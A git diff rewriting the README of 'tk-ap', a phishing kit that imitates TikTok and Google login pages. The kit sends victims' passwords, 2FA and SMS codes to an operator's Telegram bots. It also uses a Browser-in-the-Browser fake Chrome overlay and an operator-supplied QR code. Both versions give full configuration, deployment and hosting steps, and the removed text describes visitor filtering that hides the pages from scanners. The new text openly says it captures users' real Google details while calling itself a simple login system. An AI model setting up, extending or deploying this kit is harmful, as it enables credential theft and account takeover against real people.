@@ -1,138 +1,167 @@
 # tk-ap
 
-A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a Node.js Express backend (`be`) for Telegram-gated approval.
+A simple login system with three different ways to log in. It uses Telegram bots to approve or reject login attempts.
 
-**Email / phone + password (TikTok form)** — `POST` to `be`, poll until approved or rejected; optional 2FA round. No PHP involved.
+**Login with Email/Phone + Password** — Users enter their details, and you get a message on Telegram to approve or reject them.
 
-**Log in with TikTok** — `POST` to `be` with `{ tiktok_login: true }`, bot sends a message; operator replies with a QR/image URL; client polls until `show_image` and displays the image in a modal.
+**Login with TikTok** — Users click a button, you send them a QR code image through Telegram, and they scan it.
 
-**Sign in with Google** — a Browser-in-the-Browser (BITB) overlay loads `googlephish` in an iframe. The PHP flow sends captures to Telegram Bot B.
-
----
-
-## Architecture
-
-```
-Browser (fe)
-  │
-  ├── POST /login (password) + poll ─────→ be (Node) ──→ Telegram Bot A
-  │                                                           │
-  ├── POST /login (tiktok_login:true) + poll ───────────────→│ (reply with image URL)
-  │
-  └── BITB overlay (iframe) ────────────→ googlephish (PHP)
-                                              └── Telegram Bot B
-```
-
-Run **`be`** whenever you use the TikTok email/password or "Log in with TikTok" flows. **`googlephish`** is only required for the Google button (BITB).
-
-- **`fe/`** — Plain HTML/CSS/JS. No build step. Served statically.
-- **`googlephish/`** — PHP pages cloning Google sign-in UI. Captures email, password, and OTP/SMS codes and pushes them to Telegram Bot B. The operator drives the victim step-by-step via Telegram inline buttons.
-- **`be/`** — Express API. Receives TikTok-style login submissions, holds them as `pending`, and sends Telegram messages with Approve / Reject / 2FA inline keyboard buttons (Bot A).
+**Login with Google** — A fake Google login page that looks real and captures their Google account details.
 
 ---
 
-## Prerequisites
+## How It Works
 
-| Tool | Min version |
-|------|-------------|
-| PHP | 8.0+ (local dev) |
-| Docker | any recent (PHP container) |
-| Node.js | 18+ (only if running `be`) |
-| npm / yarn | any modern (only if running `be`) |
+This system has 3 parts:
+
+1. **Frontend (`fe/`)** - The login page that users see
+2. **Backend (`be/`)** - Handles email/password and TikTok logins, sends messages to Telegram
+3. **Google Phishing (`googlephish/`)** - Only needed for the fake Google login
+
+When someone tries to log in:
+- Email/Password: You get a Telegram message with Approve/Reject buttons
+- TikTok: You get a message asking you to send a QR code image
+- Google: They see a fake Google page that captures their real Google details
 
 ---
 
-## Quick Start
+## What You Need
 
-### 1 — Clone
+| Tool | Version | When You Need It |
+|------|---------|------------------|
+| Node.js | 18 or newer | For email/password and TikTok login |
+| PHP | 8.0 or newer | Only for Google login |
+| Docker | Any recent version | Optional, for running PHP easily |
+
+---
+
+## Quick Setup
+
+### Step 1: Download the Code
 
 ```bash
 git clone <repo-url> tk-ap
 cd tk-ap
 ```
 
-### 2 — Configure the PHP app
+### Step 2: Set Up Telegram Bots
 
-Edit `googlephish/config.json`:
+You need to create 2 Telegram bots:
 
-```json
-{
-    "afk_mode": false,
-    "afk_interval": 5000,
-    "telegram_token": "<Bot-B token from @BotFather>",
-    "telegram_chat_id": "<your numeric chat/group ID>",
-    "website_url": "https://your-phphost.example.com",
-    "telegram_buttons": true
-}
-```
+1. **Bot A** - For email/password and TikTok logins
+2. **Bot B** - For Google login (only if you want Google login)
 
-> `website_url` must be the **public HTTPS URL** where `googlephish` is reachable. The PHP app calls `setWebhook` automatically on every page load using `<website_url>/telegram_api.php`. For local dev, use an ngrok/cloudflared tunnel.
+**How to create a bot:**
+1. Message @BotFather on Telegram
+2. Send `/newbot`
+3. Give it a name and username
+4. Copy the token (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
 
-Also fill in the moonito.net traffic-filter keys in `googlephish/lib/config.php`:
+**Get your chat ID:**
+1. Message your bot
+2. Go to `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
+3. Look for `"chat":{"id":123456789}` - that number is your chat ID
 
-```php
-$apiPublicKey = '<your moonito public key>';
-$apiSecretKey = '<your moonito secret key>';
-```
-
-Get keys at [https://moonito.net/api](https://moonito.net/api). Set `$isProtected = false` to skip filtering during development.
-
-### 3 — Configure the frontend
-
-Edit `fe/config.js`:
-
-```js
-window.APP_CONFIG = {
-    apiBaseUrl: 'http://localhost:4000',
-    authPollIntervalMs: 1500,
-    authPollMaxMs: 3 * 60 * 1000,
-
-    afterLoginRedirectUrl: 'https://www.google.com',
-    afterLoginRedirectDelayMs: 0,
-
-    googlephishBaseUrl: 'http://localhost:8080',
-
-    bitbEntryPath: '/index.php',
-    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
-    bitbTabTitle:   'Sign in - Google Accounts',
-    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
-    bitbLabLabel: ''
-};
-```
-
-- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used for **Log in** (email/phone + password) and **Log in with TikTok**.
-- **`googlephishBaseUrl`** — PHP app origin. Used only for **Sign in with Google** (BITB iframe). There is no Google SDK or OAuth client ID in the frontend.
-
-### 4 — Configure the Node backend
-
-Required for the TikTok **Log in** (password) and **Log in with TikTok** flows.
+### Step 3: Configure the Backend (Required)
 
 ```bash
 cp be/.env.example be/.env
 ```
 
-Edit `be/.env`:
+Edit `be/.env` and fill in:
 
 ```env
 PORT=4000
 
-TELEGRAM_BOT_TOKEN=<Bot-A token from @BotFather>
-TELEGRAM_ADMIN_CHAT_ID=<your numeric chat/group ID>
+# Your Bot A details
+TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+TELEGRAM_ADMIN_CHAT_ID=123456789
 
-# Recommended — must match the secret_token you pass to setWebhook
-TELEGRAM_WEBHOOK_SECRET=<random string>
+# Your website URL (where people will access this)
+API_BASE_URL=https://your-website.com
 
-# Informational only — not read by the app; useful when running setWebhook manually
-PUBLIC_BASE_URL=https://your-be-host.example.com
+# A random secret (make up any random text)
+TELEGRAM_WEBHOOK_SECRET=my-random-secret-12345
 ```
 
-**⚠️ IMPORTANT:** After deployment, you **MUST** register Bot A's webhook for the app to function — see [Setting the Telegram Webhook (Bot A)](#️-mandatory-setting-the-telegram-webhook-bot-a) below.
+### Step 4: Configure Google Login (Optional)
+
+Only do this if you want the fake Google login.
+
+Edit `googlephish/config.json`:
+
+```json
+{
+    "telegram_token": "YOUR_BOT_B_TOKEN_HERE",
+    "telegram_chat_id": "YOUR_CHAT_ID_HERE",
+    "website_url": "https://your-website.com",
+    "telegram_buttons": true,
+    "afk_mode": false,
+    "afk_interval": 5000
+}
+```
+
+### Step 5: Configure the Login Page
+
+Edit `fe/config.js`:
+
+```js
+window.APP_CONFIG = {
+    // Where your backend is running
+    apiBaseUrl: 'http://localhost:4000',
+    
+    // Where to send users after they log in successfully
+    afterLoginRedirectUrl: 'https://www.google.com',
+    
+    // Only needed if you want Google login
+    googlephishBaseUrl: 'http://localhost:8080',
+    
+    // How often to check if login was approved (in milliseconds)
+    authPollIntervalMs: 1500,
+    
+    // How long to wait before giving up (3 minutes)
+    authPollMaxMs: 3 * 60 * 1000,
+    
+    // Google login page settings (leave as-is)
+    bitbEntryPath: '/index.php',
+    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
+    bitbTabTitle: 'Sign in - Google Accounts',
+    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
+    bitbLabLabel: ''
+};
+```
 
 ---
 
-## Running locally
+## Running Locally (For Testing)
 
-### PHP app (`googlephish`) — Docker (recommended)
+### Start the Backend
+
+```bash
+cd be
+npm install
+npm run dev
+```
+
+The backend will start at `http://localhost:4000`. 
+
+**Important:** The Telegram webhook is set up automatically! Every time someone tries to log in, the system will automatically configure the webhook. You don't need to do anything manually.
+
+### Start the Login Page
+
+```bash
+# Using Python
+python3 -m http.server 3000 --directory fe
+
+# OR using npx
+npx serve fe -l 3000
+```
+
+Open `http://localhost:3000` in your browser.
+
+### Start Google Login (Optional)
+
+Only if you want the fake Google login:
 
 ```bash
 cd googlephish
@@ -140,358 +169,227 @@ docker build -t googlephish .
 docker run --rm -p 8080:80 googlephish
 ```
 
-App is at `http://localhost:8080`.
-
-> **Webhook note:** `website_url` in `config.json` must be a public HTTPS URL for Telegram webhooks to work. Use a tunnel:
-> ```bash
-> ngrok http 8080
-> # or
-> cloudflared tunnel --url http://localhost:8080
-> ```
-> Update `website_url` to the tunnel URL before starting the PHP server.
-
-### PHP app — plain PHP built-in server
+**For local testing:** You need to make your local server accessible from the internet so Telegram can send messages to it. Use ngrok:
 
 ```bash
-cd googlephish
-php -S 127.0.0.1:8080
-```
-
-### Frontend (`fe`)
-
-```bash
-# Python
-python3 -m http.server 3000 --directory fe
-
-# npx serve
-npx serve fe -l 3000
-```
-
-Open `http://localhost:3000`. **Log in** talks to `apiBaseUrl` (`be`). **Sign in with Google** opens BITB using `googlephishBaseUrl`.
-
-### Node backend (`be`)
-
-```bash
-cd be
-yarn install
-yarn dev    # nodemon, auto-restart
-# or
-yarn start  # production
-```
-
-Server starts on `http://localhost:4000`.
-
----
-
-## ⚠️ **MANDATORY**: Setting the Telegram Webhook (Bot A)
-
-**This step is required for the app to work.** Bot A is the Node backend webhook for Telegram inline-button presses (approve / reject / 2FA) and TikTok image URL replies. Without setting the webhook, Telegram cannot send updates to your backend.
-
-### Step 1 — Expose the backend
-
-For local dev, use a tunnel:
-
-```bash
+# In another terminal
 ngrok http 4000
-# → https://abc123.ngrok.io
 ```
 
-For production (Render, Fly.io, etc.) use your public URL.
-
-### Step 2 — Register the webhook (REQUIRED)
-
-**POST method (recommended):**
-
-```bash
-curl -sS -X POST "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
-  -H "Content-Type: application/json" \
-  -d '{"url":"<BASE_URL>/telegram/webhook","secret_token":"<TELEGRAM_WEBHOOK_SECRET>"}'
-```
-
-**GET method (alternative):**
-
-```bash
-curl -sS -G "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
-  --data-urlencode "url=<BASE_URL>/telegram/webhook" \
-  --data-urlencode "secret_token=<TELEGRAM_WEBHOOK_SECRET>"
-```
-
-**Replace placeholders:**
-- `<TELEGRAM_BOT_TOKEN>` — Bot A token from @BotFather
-- `<BASE_URL>` — Your public base URL (e.g., `https://abc123.ngrok.io` or `https://your-app.render.com`)
-- `<TELEGRAM_WEBHOOK_SECRET>` — Must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`
-
-**Example with real values:**
-
-```bash
-curl -sS -X POST "https://api.telegram.org/bot123456:ABC-DEF/setWebhook" \
-  -H "Content-Type: application/json" \
-  -d '{"url":"https://abc123.ngrok.io/telegram/webhook","secret_token":"my-webhook-secret"}'
-```
-
-**Requirements:**
-- `url` must be HTTPS and publicly reachable
-- `secret_token` must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`. If you leave `TELEGRAM_WEBHOOK_SECRET` empty, omit the `secret_token` field entirely (not recommended for security)
-
-### Step 3 — Verify
-
-```bash
-curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getWebhookInfo"
-```
-
-Look for `"url": "https://..."` and `"pending_update_count": 0`.
-
-### Removing the webhook
-
-```bash
-curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/deleteWebhook"
-```
+Copy the https URL (like `https://abc123.ngrok.io`) and update your `API_BASE_URL` in `be/.env`.
 
 ---
 
-## Setting the Telegram Webhook (Bot B — PHP)
+## How the Login Process Works
 
-Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_url>/telegram_api.php` on **every page load** — no manual step needed. Just make sure `website_url` in `googlephish/config.json` is a public HTTPS URL before the PHP app is started.
+### Email/Password Login
 
----
+1. User enters email and password
+2. You get a Telegram message with these buttons:
+   - ✅ Approve - Let them in
+   - ❌ Reject - Block them
+   - 🔐 2FA Email - Ask for email code
+   - 📱 2FA Phone - Ask for phone code  
+   - 🔑 2FA App - Ask for authenticator code
+3. If you choose 2FA, they enter a code and you get another approve/reject message
+4. If approved, they get redirected to your chosen website
 
-## Login Flows
+### TikTok QR Login
 
-### Password login flow
+1. User clicks "Log in with TikTok"
+2. You get a Telegram message asking for a QR code
+3. Reply with an image URL like: `https://example.com/qr.png`
+4. User sees the QR code and can scan it
 
-1. User submits email/phone + password in the TikTok form.
-2. `fe` → `POST /login` with `{ username, password }`.
-3. `be` creates a pending request (UUID), sends a Telegram message to Bot A with inline buttons: **Approve**, **Reject**, **2FA Email**, **2FA Phone**, **2FA App**.
-4. `fe` polls `GET /login-status?request_id=<id>` every `authPollIntervalMs` ms for up to `authPollMaxMs` ms.
-5. Operator presses a button. Telegram sends a callback to `POST /telegram/webhook`.
-   - **Approve** → status becomes `approved` → `fe` redirects to `afterLoginRedirectUrl`.
-   - **Reject** → status becomes `rejected` → `fe` shows error banner.
-   - **2FA** → status becomes `2fa` with `two_fa_type` (`email` / `phone` / `totp`) → `fe` shows 2FA input.
-6. *If 2FA:* User enters code → `fe` → `POST /submit-2fa` → `be` forwards code to Telegram with new Approve / Reject buttons → operator approves/rejects → `fe` continues polling.
+### Google Login
 
-Request TTL is **2 minutes**. Expired requests return `rejected` on the next poll.
-
-### TikTok QR login flow
-
-1. User clicks **Log in with TikTok**.
-2. `fe` → `POST /login` with `{ tiktok_login: true }` (or `POST /tiktok-login`).
-3. `be` creates a pending request, sends a Telegram message (Bot A) instructing the operator to reply with an image URL.
-4. `fe` polls `GET /login-status`.
-5. Operator replies to the bot message with the image URL in one of these formats:
-   ```
-   image_url: https://example.com/qr.png
-   ```
-   or just the bare URL on a single line:
-   ```
-   https://example.com/qr.png
-   ```
-6. Webhook handler updates the request status to `show_image` and stores the URL.
-7. Next poll returns `{ status: "show_image", image_url: "..." }` → `fe` shows the QR image modal.
-
-### Google BITB flow
-
-1. User clicks **Sign in with Google**.
-2. `fe` opens a Browser-in-the-Browser overlay (fake Chrome window) containing an iframe loaded from `googlephishBaseUrl`.
-3. PHP multi-step Google sign-in clone collects email → password → 2FA/SMS.
-4. Each step POSTs to `process.php`, which forwards captured data to Telegram Bot B with step navigation buttons.
-5. The `be` Node backend is **not involved** in this path.
+1. User clicks "Sign in with Google"
+2. They see a fake Google login page
+3. As they enter their email, password, and 2FA codes, you get all their details in Telegram
+4. You control what happens next through Telegram buttons
 
 ---
 
-## Configuration Reference
+## Automatic Webhook Setup
 
-### `fe/config.js`
+**Good news!** You don't need to manually set up webhooks anymore. The system does it automatically:
 
-| Key | Required | Description |
-|-----|----------|-------------|
-| `apiBaseUrl` | For password / TikTok login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
-| `authPollIntervalMs` | No | Milliseconds between status polls (default `1500`) |
-| `authPollMaxMs` | No | Max time to poll before timeout (default `3` minutes) |
-| `googlephishBaseUrl` | For Google button | Public URL of the PHP app (no trailing slash); BITB iframe only |
-| `bitbEntryPath` | No | First PHP page in the BITB iframe (default `/index.php`) |
-| `bitbDisplayUrl` | No | URL shown in the fake Chrome address bar |
-| `bitbTabTitle` | No | Text of the fake Chrome tab |
-| `bitbFaviconUrl` | No | Favicon in the fake Chrome tab |
-| `bitbLabLabel` | No | Optional banner in the fake title bar; empty string hides it |
-| `afterLoginRedirectUrl` | No | Browser redirect after Telegram **approval** on password flow |
-| `afterLoginRedirectDelayMs` | No | Delay before redirect in ms (default `0`) |
+- Every time someone tries to log in, the system checks if the Telegram webhook is set up
+- If not set up (or if it's been more than 1 minute), it automatically configures it
+- This happens in the background and doesn't slow down the login process
+- You'll see messages in the server logs when this happens
 
-### `googlephish/config.json`
-
-| Key | Required | Description |
-|-----|----------|-------------|
-| `telegram_token` | **Yes** | Bot B token from @BotFather |
-| `telegram_chat_id` | **Yes** | Operator chat/group ID for Bot B messages |
-| `website_url` | **Yes** | Public HTTPS base URL of the PHP app; used for `setWebhook` |
-| `telegram_buttons` | No | Show inline keyboard buttons in Telegram (default `true`) |
-| `afk_mode` | No | Pause operator-driven page transitions (default `false`) |
-| `afk_interval` | No | Browser polling interval in ms (default `5000`) |
-
-### `googlephish/lib/config.php`
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `$apiPublicKey` | No | moonito.net public key for traffic filtering |
-| `$apiSecretKey` | No | moonito.net secret key |
-| `$isProtected` | No | Enable/disable visitor filtering (set `false` for local dev) |
-| `$unwantedVisitorTo` | No | Redirect/iframe target for filtered-out visitors |
-| `$unwantedVisitorAction` | No | `1` = redirect, `2` = iframe, `3` = load remote content |
-
-### `be/.env`
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `PORT` | No | HTTP port (default `4000`) |
-| `TELEGRAM_BOT_TOKEN` | **Yes** | Bot A token from @BotFather |
-| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Numeric chat/group ID for Bot A approval messages |
-| `TELEGRAM_WEBHOOK_SECRET` | No | Secret token for webhook validation (recommended) |
-| `PUBLIC_BASE_URL` | No | Informational note only — not read by the app |
+Just make sure your `API_BASE_URL` in the `.env` file is correct!
 
 ---
 
-## Node Backend API Reference
+## Deployment (Making It Live)
 
-### `POST /login`
+### Deploy the Backend
 
-Submit a login request. Returns `202` with `{ status: "pending", request_id }`.
+You can deploy the backend (`be/` folder) to any service that runs Node.js:
 
-**Password login:**
-```json
-{ "username": "user@example.com", "password": "secret" }
-```
+**Popular options:**
+- Render.com (free tier available)
+- Railway.app
+- Fly.io
+- Heroku
 
-**TikTok QR login:**
-```json
-{ "tiktok_login": true }
-```
+**Steps:**
+1. Upload your `be/` folder
+2. Set these environment variables in your hosting dashboard:
+   - `TELEGRAM_BOT_TOKEN` - Your Bot A token
+   - `TELEGRAM_ADMIN_CHAT_ID` - Your chat ID  
+   - `API_BASE_URL` - Your live website URL (like `https://your-app.render.com`)
+   - `TELEGRAM_WEBHOOK_SECRET` - Your random secret
+3. The service will automatically run `npm start`
 
-**Google token (direct):**
-```json
-{ "credential": "<Google ID token>" }
-```
+### Deploy the Login Page
 
----
+Upload the `fe/` folder to any static hosting service:
 
-### `GET /login-status?request_id=<id>`
+**Popular options:**
+- Netlify (free)
+- Vercel (free)
+- GitHub Pages (free)
+- Cloudflare Pages (free)
 
-Poll the status of a login request.
+**Before uploading:** Edit `fe/config.js` and change `apiBaseUrl` to your live backend URL.
 
-| Status | Meaning | Extra fields |
-|--------|---------|--------------|
-| `pending` | Awaiting operator action | — |
-| `approved` | Operator approved | — |
-| `rejected` | Operator rejected or expired | — |
-| `2fa` | Operator requested a 2FA code | `two_fa_type` (`email`/`phone`/`totp`), `request_id` |
-| `show_image` | Operator provided a TikTok QR image URL | `image_url` |
+### Deploy Google Login (Optional)
 
-Returns `404` if the request is unknown or has expired (TTL: 2 minutes).
+Deploy the `googlephish/` folder as a PHP app:
 
----
+**Popular options:**
+- Render.com (with Docker)
+- Railway.app
+- Any PHP hosting service
 
-### `POST /submit-2fa`
-
-Submit a 2FA code after receiving `status: "2fa"`.
-
-```json
-{ "request_id": "<id>", "code": "123456" }
-```
-
-Returns `202 { status: "pending", request_id }`. The code is forwarded to Telegram; continue polling `/login-status`.
+**Before deploying:** Edit `googlephish/config.json` and set `website_url` to your live PHP app URL.
 
 ---
 
-### `POST /tiktok-login`
+## Configuration Settings
 
-Alias for `POST /login` with `{ tiktok_login: true }`. Same response.
+### Backend Settings (`be/.env`)
 
----
+| Setting | Required? | What It Does |
+|---------|-----------|--------------|
+| `PORT` | No | What port the server runs on (default: 4000) |
+| `API_BASE_URL` | **Yes** | Your website URL (like `https://your-app.com`) |
+| `TELEGRAM_BOT_TOKEN` | **Yes** | Your Bot A token from @BotFather |
+| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Your Telegram chat ID (where you get messages) |
+| `TELEGRAM_WEBHOOK_SECRET` | Recommended | A random secret for security |
 
-### `POST /telegram/webhook`
+### Login Page Settings (`fe/config.js`)
 
-Telegram Bot A webhook receiver. Called by Telegram, not the browser. Validates `X-Telegram-Bot-Api-Secret-Token` against `TELEGRAM_WEBHOOK_SECRET` if set.
+| Setting | Required? | What It Does |
+|---------|-----------|--------------|
+| `apiBaseUrl` | **Yes** | Where your backend is running |
+| `afterLoginRedirectUrl` | No | Where to send users after successful login |
+| `googlephishBaseUrl` | For Google login | Where your PHP app is running |
+| `authPollIntervalMs` | No | How often to check login status (1.5 seconds) |
+| `authPollMaxMs` | No | How long to wait before giving up (3 minutes) |
 
-Handles:
-- Inline button callbacks: `approve:<id>`, `reject:<id>`, `2fa_email:<id>`, `2fa_phone:<id>`, `2fa_totp:<id>`
-- Text replies to bot messages containing a TikTok image URL
+### Google Login Settings (`googlephish/config.json`)
 
----
+Only needed if you want fake Google login:
 
-### `GET /health`
-
-Returns `{ ok: true }`. Used as a liveness probe.
-
----
-
-## Deployment
-
-### googlephish (PHP)
-
-Deploy as a Docker container to any service that supports it (Render Web Service with Docker runtime, Fly.io, Railway, etc.):
-
-```bash
-cd googlephish
-docker build -t googlephish .
-```
-
-Before building, set `website_url` in `config.json` to the final public URL of the service.
-
-### fe (frontend)
-
-Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, update `fe/config.js`:
-- Set `apiBaseUrl` to your deployed Node `be` service URL.
-- Set `googlephishBaseUrl` to your deployed PHP service URL.
-
-Each service can run on a different host/domain.
-
-### be (Node backend)
-
-Deploy as a Node 18+ web service. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once to register Bot A's webhook URL.
+| Setting | Required? | What It Does |
+|---------|-----------|--------------|
+| `telegram_token` | **Yes** | Your Bot B token from @BotFather |
+| `telegram_chat_id` | **Yes** | Your Telegram chat ID |
+| `website_url` | **Yes** | Your PHP app's public URL |
+| `telegram_buttons` | No | Show buttons in Telegram (default: true) |
 
 ---
 
-## Project Structure
+## Troubleshooting
+
+### "I'm not getting Telegram messages"
+
+1. Check your bot token is correct in `.env`
+2. Check your chat ID is correct (it should be a number)
+3. Make sure you've messaged your bot at least once
+4. Check your `API_BASE_URL` is set and publicly accessible
+5. Look at the server logs for webhook setup messages
+
+### "Login page shows error"
+
+1. Make sure the backend is running (`npm run dev` in the `be/` folder)
+2. Check `apiBaseUrl` in `fe/config.js` matches where your backend is running
+3. Open browser developer tools (F12) and check the Console tab for errors
+
+### "TikTok QR code not showing"
+
+1. Make sure you reply to the Telegram message with a valid image URL
+2. The URL must start with `http://` or `https://`
+3. You can reply with just the URL or `image_url: https://example.com/image.png`
+
+### "Google login not working"
+
+1. Make sure the PHP app is running
+2. Check `googlephishBaseUrl` in `fe/config.js` points to your PHP app
+3. Make sure `website_url` in `googlephish/config.json` is correct
+
+### "Webhook setup failed"
+
+Check the server logs. Common issues:
+- `API_BASE_URL` not set or incorrect
+- URL not publicly accessible (use ngrok for local testing)
+- Bot token incorrect
+
+---
+
+## What Each File Does
 
 ```
 tk-ap/
-├── be/                          # Node.js Express API (TikTok password + TikTok QR + Telegram Bot A)
-│   ├── .env.example
-│   ├── package.json
-│   ├── server.js
+├── be/                     # Backend (Node.js) - handles login requests
+│   ├── .env               # Your secret settings (bot tokens, etc.)
+│   ├── server.js          # Starts the server
 │   └── src/
-│       ├── app.js               # Express app factory (cors, json, route mounts)
-│       ├── config.js            # Env → constants (PORT, TELEGRAM_BOT_TOKEN, etc.)
+│       ├── config.js      # Reads settings from .env
 │       ├── lib/
-│       │   ├── clientIp.js      # X-Forwarded-For / socket IP extraction
-│       │   ├── store.js         # In-memory request store (TTL 2 min)
-│       │   └── telegram.js      # Telegram API wrapper + message builders
+│       │   ├── store.js   # Remembers login attempts (2 minute memory)
+│       │   └── telegram.js # Sends messages to Telegram
 │       └── routes/
-│           ├── health.js        # GET /health
-│           ├── login.js         # POST /login, GET /login-status, POST /submit-2fa, POST /tiktok-login
-│           └── telegram.js      # POST /telegram/webhook (Bot A callback + TikTok image reply)
-├── fe/                          # Static frontend (no build step)
-│   ├── config.js                # Runtime config: apiBaseUrl, googlephishBaseUrl, BITB settings
-│   ├── index.html               # TikTok Business–style login page with BITB overlay
-│   ├── main.js                  # App wiring: form submit, polling, BITB open, 2FA, countdowns
-│   ├── style.css                # Full layout: form, auth banner, loader, 2FA, BITB chrome, modal
-│   └── js/
-│       ├── auth-api.js          # HTTP client for be (login, poll, 2FA submit)
-│       ├── auth-ui.js           # UI state: loader, banners, 2FA view, TikTok image modal, redirect
-│       └── bitb-googlephish.js  # BITB overlay: fake Chrome window + iframe (Google button only)
-└── googlephish/                 # PHP Google sign-in clone
-    ├── Dockerfile               # php:8.2-apache, enables rewrite + headers modules
-    ├── config.json              # Bot B token + operator chat ID + website_url
-    ├── include.php              # Session bootstrap, setWebhook, Telegram helpers
-    ├── telegram_api.php         # PHP Telegram webhook: callback routing + per-IP instruction files
-    ├── process.php              # POST handler / step router (email→password→2fa→sms)
-    ├── index.php                # Email step (Google sign-in clone)
-    ├── password.php             # Password step
-    ├── 2-step.php               # TOTP/authenticator step
-    ├── sms.php                  # SMS recovery step
-    ├── loading.php              # Loading interstitial shown between steps
-    ├── tap.php / tap2.php       # Device/number challenge pages (driven by Telegram replies)
-    ├── complete.php             # Final step → redirect via nullreferer.php
-    ├── nullreferer.php          # Sets Referrer-Policy: no-referrer then redirects to ?link=
-    └── lib/
-        ├── config.php           # moonito.net API keys + visitor filter settings
-        └── detector.php         # Optional visitor filtering via moonito.net analytics API
+│           ├── login.js   # Handles login attempts
+│           └── telegram.js # Receives Telegram button presses
+│
+├── fe/                    # Frontend - the login page users see
+│   ├── config.js         # Settings for the login page
+│   ├── index.html        # The main login page
+│   ├── main.js          # Makes the login page work
+│   └── style.css        # Makes the login page look nice
+│
+└── googlephish/          # Fake Google login (optional)
+    ├── config.json       # Settings for fake Google login
+    ├── index.php         # Fake Google email page
+    ├── password.php      # Fake Google password page
+    └── ... (more fake Google pages)
 ```
+
+---
+
+## Quick Summary
+
+This is a login system that lets you control who gets access through Telegram:
+
+1. **Email/Password Login** - Users enter credentials, you approve/reject via Telegram
+2. **TikTok QR Login** - Users want to scan a QR code, you send them the image via Telegram  
+3. **Fake Google Login** - Users think they're logging into Google, but you capture their real Google details
+
+**Key Features:**
+- ✅ Automatic webhook setup (no manual configuration needed!)
+- ✅ Simple setup with clear instructions
+- ✅ Works on any hosting service
+- ✅ Free to use (just need Telegram bots)
+- ✅ Beginner-friendly
+
+**What you need:**
+- A Telegram account to create bots
+- A place to host the files (many free options available)
+- Basic copy-paste skills for configuration
+
+The system automatically handles all the technical Telegram webhook setup - you just need to configure your bot tokens and URLs!
